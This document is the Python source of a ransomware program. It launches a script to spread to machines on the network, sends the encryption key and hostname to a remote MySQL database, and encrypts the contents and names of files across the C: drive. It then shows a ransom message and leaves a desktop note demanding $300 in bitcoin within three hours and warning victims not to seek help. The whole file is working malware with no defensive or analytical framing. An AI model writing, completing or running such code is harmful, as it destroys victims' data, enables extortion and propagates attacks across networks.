import mysql.connector
from socket import gethostname
from os import walk
from os import path
from os import rename
from subprocess import call
from getpass import getuser
from cryptography.fernet import Fernet
from Extensions import get_extensions
from win32ui import *
from win32con import *

# Running Ransomware on all IPs connected to the network
try:call(["bash", "./Runner.sh"])
except: pass

# Creating encryption key
key = Fernet.generate_key()
f = Fernet(key)

# Database connection
conn = mysql.connector.connect(
    host = "*****",
    user = "*****",
    password = "*****",
    database = "*****",
)
c = conn.cursor()

# Sending key and id to database
c.execute(f"INSERT INTO decryption_keys (keys) VALUES ({key} + ' ' + {gethostname()})")
conn.commit()

# Get base file name
name = path.basename(__file__)

# Extensions to encrypt
extensions = get_extensions()

# Scanning entire C drive
for root, dirs, files in walk("C:\\"):
    # Grabbing files
    for file in files:
        fpath  = root + "\\" + file
        ext = path.splitext(root + "\\" + file)[1]

        # Encrypting only files with specific extension
        if ext in extensions:
            # Checking the file is accessible
            try:
                # Encrypting content
                with open(fpath, "rb") as of:
                    original: bytes = of.read()

                encrypted = f.encrypt(original)

                with open(fpath, "wb") as of:
                    of.write(encrypted)

                # Encrypting filename
                filename = f.encrypt(file.encode())
                newpath: str = root + "\\" + filename.decode()
                rename(fpath, newpath)
            except:
                pass

# Warning message
MessageBox(
    "All of your important files have been encrypted\n"
    "you have 3 hours to send 300$ in bitcoins to this address -> cooladdress.org.\n"
    "If you will not, all of your important data will be sold, all of your password, wil be sold\n"
    "Good luck.",
    "Replica",
    MB_ICONWARNING
)

# Writing backup instructions file
desktop = f"C:/Users/{getuser()}/Desktop/README.txt"

with open(desktop, "w") as d:
    d.write(
            "IMPORTANT!\n"
            "This is a important file, you'll need this for decrypting your files.\n"
            f"This is your id, {gethostname()}, put this somewhere safe, because when you'll send the money we will "
            "need this.\n "
            "All of your important files have been encrypted, there's no way you can get them back except one.\n"
            "For getting all of your files back you need to send 300$ in bitcoin to this address -> cooladdress.org.\n"
            "After you've paid the 300$ you'll eventually get your files back, don't try to do this things:"
            "1) Decrypt the files yourself.\n"
            "2) Seek for help.\n"
            "3) Send less money.\n"
            "4) Forget, delete or loose your id.\n"
            "Good luck."
    )